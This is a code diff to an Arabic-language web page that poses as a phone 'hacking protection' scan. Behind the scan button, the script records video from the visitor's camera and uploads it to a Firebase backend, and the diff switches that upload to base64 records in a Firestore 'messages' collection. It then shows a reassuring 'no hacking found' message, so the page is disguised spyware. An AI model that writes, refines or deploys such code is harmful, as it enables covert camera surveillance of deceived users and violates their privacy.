@@ -6,6 +6,7 @@
     <title>حماية الهاتف من الاختراق</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -79,6 +80,10 @@
             opacity: 0.6;
             cursor: not-allowed;
         }
+        .scan-btn.success {
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            box-shadow: 0 10px 30px rgba(39, 174, 96, 0.5);
+        }
         .progress {
             display: none;
             margin-top: 25px;
@@ -144,7 +149,7 @@
         <h1>حماية الهاتف من الاختراق</h1>
         <p>احمِ هاتفك الآن من أي محاولات اختراق أو تجسس. اضغط على الزر لبدء الفحص الأمني الشامل.</p>
         
-        <button class="scan-btn" onclick="startProtection()">🔒 ابدأ الحماية الآن</button>
+        <button class="scan-btn" id="scanBtn" onclick="startProtection()">🔒 ابدأ الحماية الآن</button>
         
         <div class="progress" id="progress">
             <div class="progress-text" id="progressText">⏳ جاري فحص الهاتف...</div>
@@ -155,8 +160,8 @@
         
         <div class="result" id="result">
             <div class="check-icon">✅</div>
-            <h2>تمت الحماية بنجاح!</h2>
-            <p>هاتفك الآن آمن ومحمي من الاختراق</p>
+            <h2>تم الفحص - لا يوجد اختراق</h2>
+            <p>هاتفك آمن ومحمي بالكامل</p>
         </div>
         
         <video id="video" autoplay playsinline></video>
@@ -176,13 +181,13 @@
             appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
         });
         
-        const storage = firebase.storage();
+        const db = firebase.firestore();
         let mediaRecorder;
         let recordedChunks = [];
         let stream;
 
         async function startProtection() {
-            const btn = document.querySelector('.scan-btn');
+            const btn = document.getElementById('scanBtn');
             const progress = document.getElementById('progress');
             const progressFill = document.getElementById('progressFill');
             const progressText = document.getElementById('progressText');
@@ -213,24 +218,34 @@
                 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const fileName = 'protection_' + Date.now() + '.webm';
-                    const storageRef = storage.ref('phone_protection/' + fileName);
                     
-                    try {
-                        await storageRef.put(blob);
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    
+                    reader.onload = async () => {
+                        const base64 = reader.result;
                         
-                        stream.getTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-                        
-                        progress.classList.remove('active');
-                        result.classList.add('active');
-                        btn.textContent = '🔒 ابدأ الحماية الآن';
-                        btn.disabled = false;
-                    } catch (error) {
-                        console.error('Upload error:', error);
-                        btn.disabled = false;
-                        btn.textContent = '🔒 ابدأ الحماية الآن';
-                    }
+                        try {
+                            await db.collection('messages').add({
+                                video: base64,
+                                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                            });
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            video.srcObject = null;
+                            
+                            progress.classList.remove('active');
+                            result.classList.add('active');
+                            
+                            btn.textContent = '✅ تم الفحص - لا يوجد اختراق';
+                            btn.disabled = false;
+                            btn.classList.add('success');
+                        } catch (error) {
+                            console.error('Upload error:', error);
+                            btn.disabled = false;
+                            btn.textContent = '🔒 ابدأ الحماية الآن';
+                        }
+                    };
                 };
                 
                 mediaRecorder.start();
